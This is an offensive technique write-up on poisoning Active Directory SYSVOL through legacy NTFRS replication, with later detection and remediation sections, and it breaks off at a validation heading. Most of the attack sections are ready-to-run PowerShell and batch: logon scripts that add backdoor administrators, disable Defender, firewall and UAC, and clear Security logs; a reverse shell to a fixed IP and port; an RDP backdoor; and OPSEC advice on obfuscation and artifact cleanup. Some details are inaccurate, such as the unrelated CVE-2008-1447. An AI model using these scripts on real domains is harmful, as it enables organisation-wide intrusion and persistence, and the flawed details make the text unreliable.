# CA-UNSC-004: NTFRS SYSVOL Replication Abuse

## 1. METADATA & CLASSIFICATION

| Field | Value |
|-------|-------|
| **Technique ID** | CA-UNSC-004 |
| **Technique Name** | NTFRS SYSVOL replication abuse |
| **MITRE ATT&CK** | T1552.006 |
| **CVE** | CVE-2008-1447, CVE-2011-0034 (NTFRS legacy) |
| **Environment** | Windows Active Directory (NTFRS-configured domains) |
| **Tactic** | Credential Access (TA0006), Persistence (TA0003) |
| **Data Source** | Network Traffic: Network Connection Creation (DC0007) |
| **Technique Status** | ACTIVE - Affects legacy domains with NTFRS still in use |
| **Last Verified** | January 2026 |
| **Affected Versions** | Windows Server 2003, 2008, 2008 R2, 2012, 2012 R2, 2016 (if NTFRS not migrated) |
| **Patched In** | DFSR migration (mandatory in Windows Server 2019+) - Deprecation enforced via DfsrMig |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

The NT File Replication Service (NTFRS) is a legacy protocol used to replicate the SYSVOL share across domain controllers in Active Directory environments. First introduced in Windows 2000, NTFRS was deprecated in Windows Server 2008 R2 and is no longer supported in Windows Server 2019 and later. Despite being obsolete, NTFRS continues to operate in many organizations that have not migrated to Distributed File System Replication (DFSR). This creates a significant security vulnerability: attackers can intercept or poison SYSVOL replication traffic to distribute malicious Group Policy Objects (GPOs), logon scripts, and credential containers across all domain controllers in the forest.

Unlike GPP credential extraction (CA-UNSC-003), NTFRS abuse allows attackers to:
- Maintain **persistent** control through replicated malware
- Bypass **single-endpoint** remediation (poisoned content replicates across all DCs)
- Execute **organization-wide** logon script injection
- Achieve **lateral movement** by modifying GPO security settings

This technique is particularly dangerous because it affects entire domains and is difficult to detect due to legacy protocol limitations and weak event logging.

**Risk Level**: CRITICAL  
**Exploitability**: High (requires DC compromise or replication interception)  
**Detection Difficulty**: High (weak NTFRS logging, expected network activity)  
**Blast Radius**: Organization-wide (all systems receiving replicated SYSVOL)

---

## 3. ATTACK NARRATIVE

### Reconnaissance Phase
An attacker performs reconnaissance to identify:
- Domain controllers still using NTFRS for SYSVOL replication
- Replication topology (which DCs replicate with which)
- Absence of SMB signing enforcement on replication traffic
- SYSVOL folder structure and existing GPO content
- Current logon script configuration

Tools used: `Nltest.exe`, `Repadmin.exe`, `Get-ADReplicationPartnerMetadata`, network traffic analysis.

### Initial Compromise Phase
The attacker obtains:
- Compromise of at least one domain controller (via lateral movement, vulnerability exploitation, or supply chain)
- Service account credentials used for NTFRS replication (typically SYSTEM on DC)
- Write access to SYSVOL share or ability to intercept replication traffic

### Exploitation Phase
The attacker:
1. Modifies existing SYSVOL content (GPOs, logon scripts)
2. Injects malicious logon scripts (e.g., `Logon.bat`, `Logon.vbs`)
3. Poisons Group Policy Objects to modify security settings (remove MFA, add backdoor accounts)
4. Adds attacker-controlled scripts to NETLOGON share
5. Leverages NTFRS's automatic replication to propagate to all DCs

### Replication Phase
NTFRS replicates the poisoned content to all partner DCs via RPC over TCP:
- Changes propagate through the replication topology
- Each DC receives malicious GPO/script in normal replication cycle
- No signature validation (NTFRS lacks integrity checking)
- Replication convergence reaches entire organization within minutes to hours

### Execution Phase
On all domain-joined systems:
- Systems apply poisoned GPO during next Group Policy refresh (every 90-120 minutes)
- Logon scripts execute under user/system context automatically
- Malicious GPO settings take effect (disable AV, add local admins, etc.)
- Organization-wide compromise achieved

### Persistence Phase
The poisoned content persists because:
- Malicious changes are now "legitimate" SYSVOL content (replicated to all DCs)
- Standard remediation (single DC restoration) doesn't work—other DCs re-poison the restored DC
- Requires forest-wide recovery or complete SYSVOL deletion and rebuild

---

## 4. TECHNICAL FOUNDATION

### NTFRS Architecture

**Replication Model**:
```
Domain Controller 1 (Master)
    ↓ (RPC over TCP, legacy NTFRS protocol)
Domain Controller 2 (Replica)
    ↓ (RPC over TCP, legacy NTFRS protocol)
Domain Controller 3 (Replica)
    ↓ (RPC over TCP, legacy NTFRS protocol)
Domain Controller N (Replica)

All DCs store: C:\Windows\SYSVOL\domain\Policies\...
All endpoints apply: \\DC\SYSVOL GPOs via Group Policy processing
```

**Replication Protocol Details**:
- **Protocol**: RPC (Remote Procedure Call) over TCP
- **Default Port**: TCP 135-139 (RPC Endpoint Mapper)
- **Legacy FRS Port**: TCP 5722 (File Replication Service)
- **Authentication**: NTLM or Kerberos (AD credentials)
- **Encryption**: OPTIONAL (not enforced by default on legacy NTFRS)
- **Signing**: NOT ENFORCED on NTFRS traffic (SMB signing optional)
- **Integrity Check**: NONE (no content validation during replication)

**Vulnerable Configuration Elements**:
1. **No SMB Signing**: Allows NTLM relay attacks and MITM
2. **Unencrypted RPC**: Replication traffic can be intercepted
3. **No Content Validation**: Replicated files not cryptographically verified
4. **Automatic Replication**: No human approval for changes
5. **Legacy Event Logging**: FRS events lack detail for detection

### SYSVOL Structure & Content Vulnerability

**SYSVOL Organization**:
```
\\domain\SYSVOL\
├── Policies\
│   ├── {GUID1}\
│   │   ├── Machine\
│   │   │   ├── Preferences\
│   │   │   │   └── Groups.xml (GPP credentials - CA-UNSC-003)
│   │   │   ├── Scripts\
│   │   │   │   └── Shutdown\shutdown.bat (executable)
│   │   │   └── Registry.pol (GPO registry settings)
│   │   └── User\
│   │       ├── Preferences\
│   │       │   └── Drives\Drives.xml
│   │       └── Scripts\
│   │           └── Logon\logon.vbs (EXECUTES ON USER LOGON)
│   └── {GUID2}\
│       └── [Similar structure]
└── NETLOGON\
    ├── Logon.bat (organization logon script)
    ├── Logon.vbs (PowerShell/VBScript logon script)
    └── [Custom scripts]
```

**Injection Points**:
1. **Logon Scripts** (`NETLOGON\Logon.bat`, `Logon.vbs`):
   - Execute every user logon
   - Run with user privileges
   - Can execute arbitrary commands
   - Widely deployed across organization

2. **Group Policy Scripts**:
   - Startup/Shutdown scripts (SYSTEM context)
   - Logon/Logoff scripts (User context)
   - Scheduled task creation via GPO
   - Registry modification via GPO

3. **Group Policy Objects (GPO)**:
   - Modify security settings
   - Disable Windows Defender/Windows Update
   - Add local administrator accounts
   - Deploy RDP backdoors
   - Modify UAC policies

### Replication Exploitation Mechanics

**Attack Vector A: DC Compromise → SYSVOL Poisoning**
```
1. Attacker compromises DC via:
   - Lateral movement from compromised workstation (Mimikatz, pass-the-hash)
   - Vulnerability on DC (RDP, SMB, SQL Server, etc.)
   - Supply chain compromise
   
2. Attacker gains SYSTEM access on DC
   
3. Attacker modifies SYSVOL directly:
   - Edit NETLOGON\Logon.bat to execute malicious code
   - Modify \Policies\{GUID}\Machine\Scripts\Shutdown\*
   - Add PowerShell backdoor to logon script
   
4. NTFRS detects file change
   
5. NTFRS triggers replication cycle:
   - Scans SYSVOL for modified files (based on timestamps/USN Journal)
   - Packages changed files for replication
   - Pushes to replication partners via RPC
   
6. All partner DCs receive and accept changes:
   - File content written to their local SYSVOL
   - Replication convergence reached within 15-60 minutes
   
7. All systems apply poisoned GPO:
   - Group Policy refresh cycle (every 90-120 minutes)
   - Logon scripts execute on every user logon
   - Organization-wide compromise achieved
```

**Attack Vector B: Replication Traffic Interception**
```
1. Attacker positions on network (MITM, compromised router, etc.)
   
2. Attacker intercepts NTFRS replication RPC traffic
   
3. Attacker modifies RPC payload:
   - File content substitution (replace logon.bat with malicious version)
   - File injection (add new malicious script to SYSVOL)
   - Metadata manipulation (timestamps, file size)
   
4. Modified payload delivered to target DC
   
5. Target DC accepts (no signature validation)
   
6. Malicious content propagates to other DCs
   
7. Organization-wide execution through GPO processing
```

---

## 5. PREREQUISITES FOR EXPLOITATION

### Attacker Requirements for DC Compromise Vector
- ✓ Network access to domain controller (RDP, SMB, or remote service)
- ✓ Credentials or exploit for initial DC compromise
- ✓ Privilege escalation to SYSTEM on compromised DC
- ✓ Write access to SYSVOL share (default: accessible after SYSTEM)
- ✓ Understanding of GPO structure and script execution context

### Attacker Requirements for Replication Interception Vector
- ✓ Network position between domain controllers (ARP spoofing, BGP hijacking, DNS hijacking)
- ✓ Ability to intercept RPC traffic (port 135-139, 5722)
- ✓ RPC protocol understanding or pre-built MITM tools
- ✓ Knowledge of NTFRS packet structure
- ✓ No SMB signing enforcement on replication traffic

### Environmental Conditions
- ✓ NTFRS still in use for SYSVOL replication (not migrated to DFSR)
- ✓ Multiple domain controllers (single DC = no replication needed)
- ✓ Network connectivity between DCs (for replication to work)
- ✓ Absence of network segmentation between DC replication partners
- ✓ Weak or no SMB signing enforcement on SYSVOL
- ✓ Minimal FRS event log monitoring
- ✓ No SYSVOL file integrity monitoring

### Verification that NTFRS is in Use
```powershell
# Check NTFRS migration status
DfsrMig /GetMigrationState

# Output interpretation:
# 0 = "Not started" (NTFRS in use)
# 1 = "In progress" (Risky - mixed state)
# 2 = "Prepared" (Still transitioning)
# 3 = "Completed" (DFSR active, NTFRS eliminated)

# If output shows "DFSR migration has not yet initialized" = NTFRS ACTIVE
```

---

## 6. ATTACK EXECUTION METHODS

### Method 1: Direct DC SYSVOL Modification (Post-Compromise)

**Description**: Attacker with SYSTEM access on compromised DC directly modifies SYSVOL content, relying on NTFRS to replicate to all other DCs.

**Prerequisites**:
- SYSTEM-level access on compromised domain controller
- Write access to `C:\Windows\SYSVOL\domain\Policies\NETLOGON\`
- NTFRS service running and configured for replication

**Step-by-Step**:

```powershell
# Step 1: Verify SYSVOL location and accessibility
cmd /c net share SYSVOL

# Expected output:
# Share name        SYSVOL
# Path              C:\Windows\SYSVOL
# Remark            Logon server share
# Maximum users     No limit

# Step 2: Identify NETLOGON share path
$sysvol = "C:\Windows\SYSVOL\$(((Get-ADDomain).DNSRoot).ToLower())\NETLOGON"
Write-Host "NETLOGON path: $sysvol"

# Step 3: Create malicious logon script
$maliciousScript = @"
@echo off
REM Add attacker backdoor user
net user attacker P@ssw0rd123! /add
net localgroup administrators attacker /add

REM Disable Windows Defender
powershell -NoProfile -Command "Disable-WindowsOptionalFeature -Online -FeatureName 'Windows-Defender' -NoRestart"

REM Execute C2 beacon
C:\Windows\Temp\beacon.exe

REM Clear event logs
wevtutil cl Security /confirm:false
"@

# Step 4: Write malicious script to NETLOGON
Add-Content -Path "$sysvol\Logon.bat" -Value $maliciousScript -Force

# Step 5: Trigger NTFRS update by modifying file metadata
$(Get-Item "$sysvol\Logon.bat").LastWriteTime = Get-Date

# Step 6: Monitor replication status
repadmin /replstat

# Expected behavior:
# NTFRS detects file modification within 5 minutes
# Initiates replication to all DC partners
# All DCs receive Logon.bat within 15-60 minutes
# Logon scripts execute on ALL user logons across organization
```

**Alternative - Inject into existing Group Policy Object**:

```powershell
# Access active GPO directory
$gpoPoliciesPath = "C:\Windows\SYSVOL\$(((Get-ADDomain).DNSRoot).ToLower())\Policies"

# List existing GPOs
Get-ChildItem $gpoPoliciesPath -Directory | Where-Object {$_.Name -match '^\{[A-F0-9]{8}'} | Select-Object Name

# Example: Inject into Default Domain Policy {6AC1786C-016F-11D2-945F-00C04fB984F9}
$targetGPO = "$gpoPoliciesPath\{6AC1786C-016F-11D2-945F-00C04fB984F9}"

# Inject malicious startup script
$startupScript = "C:\Temp\backdoor.ps1"
$scriptPath = "$targetGPO\Machine\Scripts\Startup\"
New-Item -Path $scriptPath -ItemType Directory -Force | Out-Null
Copy-Item $startupScript -Destination "$scriptPath\run.ps1" -Force
```

**Replication Timeline**:
- T+0: File modification on DC1
- T+5min: NTFRS detects change
- T+5-10min: Replication to DC2, DC3, etc. begins
- T+15-60min: Replication convergence (all DCs have malicious content)
- T+1-2hrs: First user logon triggers malicious script
- T+2-4hrs: Organization-wide compromise via subsequent logons

---

### Method 2: NTFRS Replication Partner Enumeration & Manipulation

**Description**: Attacker enumerates replication topology and selectively modifies replication to inject changes into specific DCs.

**Commands**:

```powershell
# Step 1: Enumerate replication topology
repadmin /showrepl

# Output shows:
# Partner DCs
# Replication direction (inbound/outbound)
# Last replication timestamp
# Replication status

# Step 2: Identify NTFRS replication status
DfsrMig /GetMigrationState
DfsrMig /GetGlobalState

# Step 3: Query NTFRS configuration in Active Directory
$searchBase = "CN=Domain System Volume (SYSVOL share),CN=File Replication Service,CN=System,DC=domain,DC=com"
Get-ADObject -SearchBase $searchBase -Filter * -Properties * | Select-Object dn, whenCreated, whenChanged

# Step 4: Check FRS event logs on DC
Get-WinEvent -LogName "File Replication Service" -MaxEvents 100 | Select-Object TimeCreated, Message

# Step 5: Modify SYSVOL and observe replication
# (Same as Method 1: direct file modification)

# Step 6: Verify replication completion
repadmin /replsum /bysrc /bydest

# Expected output:
# Replication Summary Start Time: [timestamp]
# Total Modifications Since Boot: X
# DC1: Partner DCs and sync status
```

---

### Method 3: Logon Script Injection via Group Policy

**Description**: Attacker modifies Group Policy to execute arbitrary scripts at logon, leveraging NTFRS to distribute across all DCs.

**PowerShell Execution**:

```powershell
# Step 1: Mount the compromised DC's SYSVOL
$dcName = "DC01.domain.com"
$sysvol = "\\$dcName\SYSVOL\domain.com"

# Step 2: Find GPO with logon scripts configured
$gpoPath = "$sysvol\Policies"
Get-ChildItem $gpoPath -Recurse -Filter "Scripts.ini" | Select-Object FullName

# Step 3: Locate User logon script configuration
$scriptPoliciesPath = "$gpoPath\{*}\User\Scripts\Logon"
Get-ChildItem $scriptPoliciesPath -ErrorAction SilentlyContinue

# Step 4: Create malicious PowerShell script
$maliciousPs1 = @"
# Hidden backdoor - persistence via scheduled task
$taskAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -Command "C:\Windows\Temp\beacon.ps1"'
$taskTrigger = New-ScheduledTaskTrigger -AtLogOn
$taskPrincipal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel 'Highest'
Register-ScheduledTask -TaskName 'SystemMaintenance' -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Force | Out-Null

# Reverse shell execution
$ip = "10.0.0.50"; $port = 4444
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
[byte[]]$buffer = 0..1023 | ForEach-Object {0}
$stream.Read($buffer, 0, 1024)
$ps = [System.Diagnostics.Process]::Start('powershell.exe')
$ps.StandardInput.WriteLine('whoami')
"@

# Step 5: Write to logon script path
$logonScriptPath = "$gpoPath\{6AC1786C-016F-11D2-945F-00C04fB984F9}\User\Scripts\Logon\malicious.ps1"
New-Item -Path (Split-Path $logonScriptPath) -ItemType Directory -Force | Out-Null
Set-Content -Path $logonScriptPath -Value $maliciousPs1 -Force

# Step 6: Update Scripts.ini to reference new script
$scriptsIni = "$gpoPath\{6AC1786C-016F-11D2-945F-00C04fB984F9}\User\Scripts\Scripts.ini"
Add-Content -Path $scriptsIni -Value "[Logon]`n0CmdLine=powershell.exe`n0Parameters=-NoProfile -ExecutionPolicy Bypass -File malicious.ps1"

# Step 7: Force NTFRS replication
Stop-Service NTFRS -Force
Start-Service NTFRS

# Step 8: Verify replication status
repadmin /replsum
```

**Replication & Execution Timeline**:
- T+0: Logon script modified on DC1
- T+5-10min: NTFRS replicates to all DCs
- T+30min-2hrs: Users next logon trigger malicious script
- T+2-4hrs: All users receive backdoor (via scheduled task)

---

### Method 4: GPO Security Setting Poisoning

**Description**: Modify Group Policy Objects to disable security controls and create backdoor accounts across the entire domain.

**Execution**:

```powershell
# Step 1: Access GPO Registry Settings (Registry.pol)
$gpoPoliciesPath = "C:\Windows\SYSVOL\$(((Get-ADDomain).DNSRoot).ToLower())\Policies"
$targetGPO = "$gpoPoliciesPath\{6AC1786C-016F-11D2-945F-00C04fB984F9}\Machine\Registry.pol"

# Step 2: Modify Registry.pol to disable Windows Defender
# Note: Registry.pol is binary format (requires tool to edit)
# Using Mimikatz or custom tool:
# - Disable: HKLM\Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware = 1
# - Disable Real-Time Protection: HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring = 1

# Step 3: Create local admin via Group Policy
# Use Group Policy Management Editor (alternative to direct file modification):
# - Edit GPO
# - User Configuration > Preferences > Control Panel Settings > Local Users and Groups
# - Create new user: "BackdoorAdmin"
# - Set password: "Complex$Password123"
# - Add to: Administrators group

# Step 4: Disable Windows Firewall
# - Computer Configuration > Policies > Windows Settings > Security Settings > Windows Firewall with Advanced Security
# - Domain Profile: Off
# - Private Profile: Off
# - Public Profile: Off

# Step 5: Disable UAC
# HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA = 0

# Step 6: Trigger NTFRS replication
Start-Service NTFRS -Verbose

# Step 7: Monitor application
repadmin /replsum

# Step 8: Verify on client endpoint
# After next GPO refresh (90-120 min or gpupdate /force)
gpresult /h report.html  # View applied GPO settings
```

---

### Method 5: Leveraging NTFRS Topology Weaknesses (Mixed Environments)

**Description**: In mixed NTFRS/DFSR environments, exploit transitional phase to inject content into NTFRS-replicated DCs that won't reach DFSR DCs, creating persistent hidden backdoors.

**Execution**:

```powershell
# Step 1: Check migration state (identify mixed environment)
DfsrMig /GetMigrationState

# Output showing "Prepared" = NTFRS still active but DFSR prepared
# This is a window where NTFRS and DFSR are both operating

# Step 2: Inject content into NTFRS DC only
$ntfrsDC = "DC01"  # Still using NTFRS
$dfrsrDC = "DC02"  # Already migrated to DFSR

# Step 3: Connect to NTFRS DC and modify SYSVOL
$sysvol = "\\$ntfrsDC\SYSVOL\domain.com\NETLOGON"
$backdoorScript = @"
# Hidden RDP backdoor
cmd /c reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
cmd /c reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f
cmd /c netsh firewall set service RemoteDesktop enable
cmd /c net user RdpBackdoor P@ssw0rd123 /add
cmd /c net localgroup "Remote Desktop Users" RdpBackdoor /add
"@

Set-Content -Path "$sysvol\backdoor.bat" -Value $backdoorScript -Force

# Step 4: Due to migration state, DFSR may not recognize NTFRS changes
# Result: Backdoor persists on NTFRS DCs but not visible to DFSR DCs
# This creates a "ghost backdoor" in mixed environments

# Step 5: When migration completes, force DFSR rescan to delete NTFRS files
DfsrMig /SetGlobalState 3

# Step 6: Monitor for missed replication during migration
repadmin /replsum /bysrc /bydest
```

---

## 7. COMMAND EXECUTION & VALIDATION

### Validation Test 1: Verify NTFRS is Vulnerable

```powershell
# Test 1a: Check if NTFRS in use
$migrationState = DfsrMig /GetMigrationState 2>&1 | Select-String "Migration state"
Write-Host $migrationState

# If output contains "not yet initialized" = NTFRS ACTIVE

# Test 1b: Check FRS service status
Get-Service NTFRS | Select-Object Name, Status, StartType

# Expected output if vulnerable:
# Name   Status StartType
# ----   ------ ---------
# NTFRS Running Automatic

# Test 1c: Verify SYSVOL replication
Test-Path "C:\Windows\SYSVOL"

# Test 1d: List replication partners
repadmin /showrepl | Select-String "NTFRS"

# Expected: Shows NTFRS replica set information
```

### Validation Test 2: Simulate Logon Script Injection

```powershell
# Test 2a: Locate NETLOGON share
$sysvol = "C:\Windows\SYSVOL\$(((Get-ADDomain).DNSRoot).ToLower())\NETLOGON"
Get-ChildItem $sysvol -Filter "*.bat", "*.vbs", "*.ps1" | Select-Object Name, LastWriteTime

# Expected: Lists existing logon scripts (should be minimal)

# Test 2b: Check script permissions
Get-Acl "$sysvol\Logon.bat" | Select-Object Access

# Test 2c: Create test file (non-malicious)
$testScript = "REM Test logon script injection detection"
Add-Content -Path "$sysvol\test_logon.bat" -Value $testScript

# Test 2d: Monitor NTFRS replication
Get-WinEvent -LogName "File Replication Service" -MaxEvents 10 -Oldest | Select-Object TimeCreated, Message | Where-Object {$_.Message -match "test_logon"}

# Expected: FRS event showing file replication detected

# Test 2e: Clean up test file
Remove-Item "$sysvol\test_logon.bat" -Force
```

### Validation Test 3: Monitor Replication Traffic

```powershell
# Test 3a: Start network trace
netsh trace start capture=yes tracefile=C:\Temp\ntfrs_capture.etl

# Test 3b: Trigger replication by modifying SYSVOL file
$testFile = "C:\Windows\SYSVOL\$(((Get-ADDomain).DNSRoot).ToLower())\NETLOGON\test.txt"
"Test content" | Out-File $testFile

# Test 3c: Stop trace
netsh trace stop

# Test 3d: Analyze trace
# Look for:
# - RPC traffic on port 135-139, 5722
# - Unencrypted NTFRS replication
# - No SMB signing on replication frames
```

---

## 8. EXPLOITATION SUCCESS INDICATORS

A successful NTFRS exploitation is confirmed when:

✓ Malicious logon script successfully replicated to all domain controllers  
✓ Script executes on user logon across organization (all endpoints)  
✓ Poisoned GPO settings applied organization-wide  
✓ Backdoor accounts created on all systems via Group Policy  
✓ Remediation attempt on single DC re-poisoned by other DCs  
✓ Malicious content visible in repadmin output across all partners  
✓ Event logs show replication of modified SYSVOL files  

**Quantifiable Success Metrics**:
- Number of domain controllers with replicated malicious content
- Number of systems that executed poisoned logon script
- Backdoor account persistence across organization
- Execution context (SYSTEM vs User) on compromised systems
- Persistence duration before detection/remediation

---

## 9. EVASION & OPERATIONAL SECURITY (OPSEC)

### Evasion Techniques

**1. Timing Obfuscation**
- Inject malicious content during known replication windows (typically off-hours)
- Use legitimate NTFRS replication cycles as cover
- Distribute poison over multiple replication cycles (avoid bulk changes)

**2. Content Obfuscation**
- Embed backdoors in existing legitimate logon scripts
- Use comments/whitespace to hide malicious code
- Obfuscate PowerShell payload using Base64, XOR, or custom encoding
- Append to existing scripts rather than replacing (less detectable)

**3. Metadata Spoofing**
- Set file timestamps to match other files in SYSVOL
- Use same file sizes as existing scripts (padding with comments)
- Modify file attributes to match legitimate scripts

**4. Replication Concealment**
- Leverage encrypted RPC channels where available (TLS 1.2)
- Intercept replication on network segment without monitoring
- Use MITM positioning that avoids alert thresholds

**5. Artifact Cleanup**
- Remove modification from FRS event logs before remediation
- Delete temporary files used during exploitation
- Cover PowerShell history and command execution logs
- Clear USN Journal entries related to SYSVOL modifications

### OPSEC Risk Factors

⚠️ **High Risk**:
- Bulk modification to multiple SYSVOL files simultaneously
- Obvious malware signatures in injected scripts
- Large file size changes (payload visibility)
- Modification outside normal replication windows
- Immediate widespread logon script execution

⚠️ **Medium Risk**:
- Single large script injection (stand-alone malware)
- PowerShell without obfuscation or signing
- Modification visible in repadmin output
- Event log anomalies in FRS logs
- Multiple backdoor accounts created simultaneously

⚠️ **Low Risk**:
- Appending to existing legitimate scripts
- Obfuscated payload (Base64-encoded, comments-wrapped)
- Modification during normal business hours/replication cycles
- Single backdoor account per DC (distributed)
- Artifacts consistent with legitimate admin activity

---

## 10. IMPACT & BLAST RADIUS

### Direct Impact
- **Organization-wide logon script execution**: All systems affected
- **Persistent backdoor access**: Survives single-DC remediation
- **Administrative privilege escalation**: Via poisoned GPO security settings
- **Service disruption**: Malicious startup/shutdown scripts on all systems
- **Credential harvesting**: All domain users/service accounts exposed

### Indirect Impact
- **Enterprise compliance violation**: Unauthorized access to all systems
- **Supply chain compromise**: If organization is software provider (builds/deployments compromised)
- **Cascading lateral movement**: From domain systems to external networks
- **Ransomware deployment**: Organization-wide encryption via poisoned GPO
- **Data exfiltration**: Backdoor scripts execute on all systems

### Blast Radius Calculation
```
Blast Radius = (Number of Domain Controllers) × (Number of Domain Systems) × (Replication Convergence Time)

Example (Large Enterprise):
- 15 domain controllers
- 5,000 domain-joined systems
- NTFRS replication convergence: 60 minutes
- Logon script execution within: 2 hours (first user logon)
- Result: 5,000 systems compromised within 2 hours
- Organization-wide compromise confirmed

Critical: Single-DC remediation FAILS due to re-poisoning from other DCs
```

---

## 11. DEFENSE MECHANISMS

### Detection at Exploitation Boundary

**Network-Level Detection**:
- Monitor unexpected RPC traffic between DCs on ports 135-139, 5722
- Alert on NTFRS replication traffic without SMB signing
- Detect file size changes in SYSVOL larger than normal GPO updates
- Monitor NTFRS traffic volume (spike = potential poisoning)

**Process-Level Detection**:
- Monitor NTFRS service activity (service should be inactive if migrated)
- Alert on file modification operations on SYSVOL by non-admin processes
- Detect PowerShell script creation in NETLOGON share
- Flag batch file modifications in SYSVOL\NETLOGON\

**Host-Level Detection**:
- Windows Event IDs (FRS events 13500-13999) - especially 13568 (replication activity)
- File access logs (Audit File System) on SYSVOL shares
- Group Policy processing event logs showing poisoned policies
- Registry modification logs for security settings changes

### Defense Summary

| Mechanism | Type | Effectiveness | Implementation |
|-----------|------|-----------------|-----------------|
| NTFRS to DFSR Migration | Preventive | Critical | Medium |
| SMB Signing Enforcement | Preventive | Medium | Low |
| SYSVOL Integrity Monitoring | Detective | High | Medium |
| FRS Event Log Monitoring | Detective | Medium | High |
| Network Segmentation (DC replication) | Preventive | High | High |
| SYSVOL File Integrity Monitoring (WDAC) | Detective | High | Medium |

---

## 12. REMEDIATION & MITIGATION

### Immediate Mitigation (0-24 hours)

**Step 1: Halt Replication Spread**
```powershell
# CRITICAL: Stop NTFRS service on all DCs EXCEPT ONE trusted master DC
# This prevents further poisoning spread

# On suspected poisoned DCs:
Stop-Service NTFRS -Force -Confirm:$false

# Keep running ONLY on master DC:
# Example: Keep DC01 running, stop DC02, DC03, etc.
```

**Step 2: Identify Poisoned Content**
```powershell
# Search all DCs for suspicious files modified in last 24 hours
$sysvol = "C:\Windows\SYSVOL\$(((Get-ADDomain).DNSRoot).ToLower())"
Get-ChildItem -Path $sysvol -Recurse -File | Where-Object {
    $_.LastWriteTime -gt (Get-Date).AddHours(-24) -and 
    ($_.Name -match "\.bat|\.vbs|\.ps1|\.exe")
} | Select-Object FullName, LastWriteTime | Export-Csv evidence.csv

# Review CSV for suspicious modifications
```

**Step 3: Preserve Evidence**
```powershell
# Backup current SYSVOL (contains evidence of attack)
$sysvol = "C:\Windows\SYSVOL"
Copy-Item $sysvol -Destination "C:\SysvolBackup_$(Get-Date -Format yyyyMMdd_HHmmss)" -Recurse -Force

# Export FRS event logs
wevtutil epl "File Replication Service" "C:\Evidence\FRS.evtx"
```

**Step 4: Clean Poisoned Content (Master DC)**
```powershell
# On TRUSTED master DC, remove malicious content
$sysvol = "C:\Windows\SYSVOL\$(((Get-ADDomain).DNSRoot).ToLower())"

# Remove suspicious logon scripts
Remove-Item "$sysvol\NETLOGON\*.bat" -Force -ErrorAction SilentlyContinue
Remove-Item "$sysvol\NETLOGON\*.vbs" -Force -ErrorAction SilentlyContinue
Remove-Item "$sysvol\NETLOGON\*.ps1" -Force -ErrorAction SilentlyContinue

# Restore from clean backup (if available from AD Backup)
# OR manually restore individual GPOs from backup
```

### Short-Term Remediation (1-7 days)

**Step 5: Migrate SYSVOL from NTFRS to DFSR**
```powershell
# Phase 1: Start migration
DfsrMig /SetGlobalState 1

# Wait for DCs to transition (can take hours to days)

# Phase 2: Monitor transition
DfsrMig /GetMigrationState

# Phase 3: Prepare phase
DfsrMig /SetGlobalState 2

# Phase 4: Complete migration
DfsrMig /SetGlobalState 3

# Verify completion
DfsrMig /GetMigrationState
# Expected: "The state is 'Completed'"
```

**Step 6: Disable/Remove NTFRS Service**
```powershell
# After DFSR migration complete:

# Stop NTFRS service on all DCs
Invoke-Command -ComputerName (Get-ADDomainController -Filter *).Name -ScriptBlock {
    Stop-Service NTFRS -Force
    Set-Service NTFRS -StartupType Disabled
}

# Verify removal from replication topology
repadmin /replsum
```

**Step 7: Reset Compromised Accounts**
```powershell
# Reset all accounts modified by attacker
# Identify via logon script analysis, Group Policy changes, etc.

# Reset compromised service accounts
Get-ADUser -Filter * -SearchBase "CN=Users,DC=domain,DC=com" | Where-Object {
    $_.Name -match "backdoor|attacker|malicious"
} | ForEach-Object {
    Set-ADAccountPassword -Identity $_ -Reset -NewPassword (ConvertTo-SecureString -AsPlainText -String "NewSecurePassword$(Get-Random)" -Force)
}

# Remove unauthorized local admin accounts from all systems
Invoke-Command -ComputerName (Get-ADComputer -Filter * | Select-Object -ExpandProperty Name) -ScriptBlock {
    $unauthorizedUsers = @("BackdoorAdmin", "attacker", "malicious")
    $unauthorizedUsers | ForEach-Object {
        net localgroup Administrators $_ /delete 2>$null
    }
}
```

### Long-Term Remediation (1-3 months)

**Step 8: Hardening Replication Security**
```powershell
# Enable SMB Signing on DC replication
# Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
# "Microsoft network server: Digitally sign communications (always)" = Enabled

# Enable DFSR encryption for replication
Get-DfsReplicationGroup | Set-DfsReplicationGroup -Encryption Required -Force

# Implement network segmentation for DC replication traffic
# Firewall rules:
# - Allow RPC dynamic port range (49152-65535) only from authorized DCs
# - Require authentication and encryption for all DC communication
```

**Step 9: Implement SYSVOL Integrity Monitoring**
```powershell
# Option A: Windows Defender Application Control (WDAC)
# Create WDAC policy for SYSVOL read-only (auditing mode first)

# Option B: File Integrity Monitoring (using SIEM/EDR)
# Monitor and alert on any changes to:
# - C:\Windows\SYSVOL\*\NETLOGON\*.* 
# - C:\Windows\SYSVOL\*\Policies\*/Machine/Scripts/*
# - C:\Windows\SYSVOL\*\Policies\*/User/Scripts/*

# Alert on unauthorized modifications
```

**Step 10: Restore Clean SYSVOL (if significant poisoning)**
```powershell
# If widespread poisoning suspected, full SYSVOL restore may be needed:

# Step 1: Backup current (poisoned) SYSVOL
Copy-Item C:\Windows\SYSVOL -Destination C:\SysvolBackup_Poisoned -Recurse

# Step 2: Restore from clean backup (must have AD backup from before compromise)
# Use Authoritative Restore: Set BurFlags = D4 on good DC
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTFRS\Parameters\Backup/Restore\Process at Startup" /v BurFlags /t REG_DWORD /d 4

# Step 3: Force replication convergence
net stop ntfrs
net start ntfrs

# Step 4: Distribute to all other DCs (Non-authoritative restore)
# On other DCs, set BurFlags = D2
```

### Validation Command (Verify Remediation)

```powershell
# After remediation, validate:

# Test 1: Verify NTFRS is disabled
